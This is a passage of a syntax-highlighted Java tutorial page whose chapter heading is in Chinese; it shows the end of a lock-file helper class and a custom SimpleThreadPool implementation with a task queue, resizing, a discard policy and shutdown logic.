            <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">createFile</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">Path</span> <span class="token function">getLockFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token constant">LOCK_PATH</span><span class="token punctuation">,</span> <span class="token constant">LOCK_FILE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Chapter8：线程池原理以及自定义线程池">Chapter8：线程池原理以及自定义线程池</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Iterator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">LinkedList</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 线程池模拟类 
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SimpleThreadPool</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>
    <span class="token comment">/* 线程池现有容量：包含FREE, RUNNING, BLOCKED 三种状态的线程 */</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> poolSize<span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">volatile</span> <span class="token keyword">int</span> seq <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">THREAD_PREFIX</span> <span class="token operator">=</span> <span class="token string">"SIMPLE_THREAD_POOL-"</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> queueSize<span class="token punctuation">;</span>

    <span class="token comment">/* 默认TASK_QUEUE的阈值 */</span>
    <span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token constant">DEFAULT_TASK_QUEUE_SIZE</span> <span class="token operator">=</span> <span class="token number">2000</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Runnable</span><span class="token punctuation">&gt;</span></span> <span class="token constant">TASK_QUEUE</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token class-name">ThreadGroup</span> <span class="token constant">GROUP</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadGroup</span><span class="token punctuation">(</span><span class="token string">"Pool_Group"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">MyThread</span><span class="token punctuation">&gt;</span></span> <span class="token constant">THREAD_QUEUE</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">DiscardPolicy</span> discardPolicy<span class="token punctuation">;</span>

    <span class="token comment">// 线程池，无能力处理，策略</span>
    <span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token class-name">DiscardPolicy</span> <span class="token constant">DEFAULT_DISCARD_POLICY</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">DiscardException</span><span class="token punctuation">(</span><span class="token string">"Discard this task"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment">// 线程池，销毁标记</span>
    <span class="token keyword">private</span> <span class="token keyword">volatile</span> <span class="token keyword">boolean</span> destroy <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> minPoolSize<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token constant">DEFAULT_MIN_POOL_SIZE</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> activePoolSize<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token constant">DEFAULT_ACTIVE_POOL_SIZE</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> maxPoolSize<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token constant">DEFAULT_MAX_POOL_SIZE</span> <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">SimpleThreadPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">(</span><span class="token constant">DEFAULT_MIN_POOL_SIZE</span><span class="token punctuation">,</span> <span class="token constant">DEFAULT_ACTIVE_POOL_SIZE</span><span class="token punctuation">,</span> <span class="token constant">DEFAULT_MAX_POOL_SIZE</span><span class="token punctuation">,</span> <span class="token constant">DEFAULT_TASK_QUEUE_SIZE</span><span class="token punctuation">,</span> <span class="token constant">DEFAULT_DISCARD_POLICY</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">SimpleThreadPool</span><span class="token punctuation">(</span><span class="token keyword">int</span> minPoolSize<span class="token punctuation">,</span> <span class="token keyword">int</span> activePoolSize<span class="token punctuation">,</span> <span class="token keyword">int</span> maxPoolSize<span class="token punctuation">,</span> <span class="token keyword">int</span> queueSize<span class="token punctuation">,</span> <span class="token class-name">DiscardPolicy</span> discardPolicy<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>minPoolSize <span class="token operator">=</span> minPoolSize<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>activePoolSize <span class="token operator">=</span> activePoolSize<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>maxPoolSize <span class="token operator">=</span> maxPoolSize<span class="token punctuation">;</span>

        <span class="token keyword">this</span><span class="token punctuation">.</span>queueSize <span class="token operator">=</span> queueSize<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>discardPolicy <span class="token operator">=</span> discardPolicy<span class="token punctuation">;</span>

        <span class="token comment">// 初始化，最小容量线程池</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> minPoolSize<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">createMyThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment">// 自定义线程池，同时也是一个线程，可以根据工作量，自动调整容量</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token constant">THREAD_PREFIX</span> <span class="token operator">+</span> <span class="token string">"head"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">resetPoolSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">createMyThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">MyThread</span> myThread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyThread</span><span class="token punctuation">(</span><span class="token constant">GROUP</span><span class="token punctuation">,</span> <span class="token constant">THREAD_PREFIX</span> <span class="token operator">+</span> <span class="token punctuation">(</span>seq<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token constant">THREAD_QUEUE</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>myThread<span class="token punctuation">)</span><span class="token punctuation">;</span>
        myThread<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 获取线程池大小：每次线程池，新增/销毁线程的时候，调用
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">resetPoolSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>poolSize <span class="token operator">=</span> <span class="token constant">THREAD_QUEUE</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 线程池，根据工作量，自动调整容量
     */</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>destroy<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 扩展线程池</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">TASK_QUEUE</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> activePoolSize <span class="token operator">&amp;&amp;</span> poolSize <span class="token operator">&lt;</span> activePoolSize<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> poolSize<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> activePoolSize<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token function">createMyThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"The pool increased to activePoolSize."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">resetPoolSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">TASK_QUEUE</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> maxPoolSize <span class="token operator">&amp;&amp;</span> poolSize <span class="token operator">&lt;</span> maxPoolSize<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> poolSize<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> maxPoolSize<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token function">createMyThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"The pool increased to maxPoolSize."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">resetPoolSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token comment">// 缩减线程池</span>
            <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token constant">THREAD_QUEUE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">TASK_QUEUE</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                        <span class="token operator">&amp;&amp;</span> <span class="token constant">THREAD_QUEUE</span><span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> e<span class="token punctuation">.</span>taskStatus <span class="token operator">==</span> <span class="token class-name">TaskStatus</span><span class="token punctuation">.</span><span class="token constant">RUNNING</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>
                        <span class="token operator">&amp;&amp;</span> poolSize <span class="token operator">&gt;</span> activePoolSize<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">int</span> releaseCount <span class="token operator">=</span> poolSize <span class="token operator">-</span> activePoolSize<span class="token punctuation">;</span>
                    <span class="token class-name">Iterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">MyThread</span><span class="token punctuation">&gt;</span></span> it <span class="token operator">=</span> <span class="token constant">THREAD_QUEUE</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">while</span> <span class="token punctuation">(</span>it<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>releaseCount <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token keyword">break</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                        <span class="token class-name">MyThread</span> myThread <span class="token operator">=</span> it<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        myThread<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        myThread<span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        it<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token operator">--</span>releaseCount<span class="token punctuation">;</span>
                        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>myThread<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" had been released"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                    <span class="token function">resetPoolSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"---- is dead"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">shutDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token comment">// 等待现有线程池中任务执行完成</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">TASK_QUEUE</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token constant">THREAD_QUEUE</span><span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> e<span class="token punctuation">.</span>taskStatus <span class="token operator">==</span> <span class="token class-name">TaskStatus</span><span class="token punctuation">.</span><span class="token constant">RUNNING</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token constant">THREAD_QUEUE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 进行关停销毁</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"The pool is ready to destroy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Iterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">MyThread</span><span class="token punctuation">&gt;</span></span> it <span class="token operator">=</span> <span class="token constant">THREAD_QUEUE</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span>it<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">MyThread</span> myThread <span class="token operator">=</span> it<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>myThread<span class="token punctuation">.</span>taskStatus <span class="token operator">==</span> <span class="token class-name">TaskStatus</span><span class="token punctuation">.</span><span class="token constant">BLOCKED</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token comment">// waiting中的线程</span>
                    myThread<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    myThread<span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    it<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"The thread pool disposed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">resetPoolSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            destroy <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"All threads had been destroyed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token class-name">Runnable</span> runnable<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>destroy<span class="token punctuation">)</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalStateException</span><span class="token punctuation">(</span><span class="token string">"The thread pool already destroy and not allow submit task."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token constant">TASK_QUEUE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">TASK_QUEUE</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> queueSize<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// 处理能力之外的任务，处理措施</span>
                discardPolicy<span class="token punctuation">.</span><span class="token function">discard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token constant">TASK_QUEUE</span><span class="token punctuation">.</span><span class="token function">addLast</span><span class="token punctuation">(</span>runnable<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token constant">TASK_QUEUE</span><span class="token punctuation">.</span><span class="token function">notifyAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">DiscardPolicy</span> <span class="token punctuation">{</span>
        <span class="token keyword">void</span> <span class="token function">discard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">DiscardException</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">DiscardException</span> <span class="token keyword">extends</span> <span class="token class-name">RuntimeException</span> <span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token class-name">DiscardException</span><span class="token punctuation">(</span><span class="token class-name">String</span> message<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">super</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">enum</span> <span class="token class-name">TaskStatus</span> <span class="token punctuation">{</span>
        <span class="token constant">FREE</span><span class="token punctuation">,</span> <span class="token constant">RUNNING</span><span class="token punctuation">,</span> <span class="token constant">BLOCKED</span><span class="token punctuation">,</span> <span class="token constant">DEAD</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">class</span> <span class="token class-name">MyThread</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token keyword">volatile</span> <span class="token class-name">TaskStatus</span> taskStatus <span class="token operator">=</span> <span class="token class-name">TaskStatus</span><span class="token punctuation">.</span><span class="token constant">FREE</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token class-name">MyThread</span><span class="token punctuation">(</span><span class="token class-name">ThreadGroup</span> group<span class="token punctuation">,</span> <span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">super</span><span class="token punctuation">(</span>group<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token constant">OUTER</span><span class="token operator">:</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>taskStatus <span class="token operator">!=</span> <span class="token class-name">TaskStatus</span><span class="token punctuation">.</span><span class="token constant">DEAD</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">Runnable</span> runnable <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
                <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token constant">TASK_QUEUE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token constant">TASK_QUEUE</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">try</span> <span class="token punctuation">{</span>
                            <span class="token comment">// 任务队列为空，线程等待，让出monitor</span>
                            <span class="token keyword">this</span><span class="token punctuation">.</span>taskStatus <span class="token operator">=</span> <span class="token class-name">TaskStatus</span><span class="token punctuation">.</span><span class="token constant">BLOCKED</span><span class="token punctuation">;</span>
                            <span class="token constant">TASK_QUEUE</span><span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token comment">// 任务队列存入数据，被唤醒，重新抢锁处理</span>
                            <span class="token keyword">break</span> <span class="token constant">OUTER</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>
                    runnable <span class="token operator">=</span> <span class="token constant">TASK_QUEUE</span><span class="token punctuation">.</span><span class="token function">removeFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">if</span> <span class="token punctuation">(</span>runnable <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">this</span><span class="token punctuation">.</span>taskStatus <span class="token operator">=</span> <span class="token class-name">TaskStatus</span><span class="token punctuation">.</span><span class="token constant">RUNNING</span><span class="token punctuation">;</span>
                    runnable<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">this</span><span class="token punctuation">.</span>taskStatus <span class="token operator">=</span> <span class="token class-name">TaskStatus</span><span class="token punctuation">.</span><span class="token constant">FREE</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>taskStatus <span class="token operator">=</span> <span class="token class-name">TaskStatus</span><span class="token punctuation">.</span><span class="token constant">DEAD</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
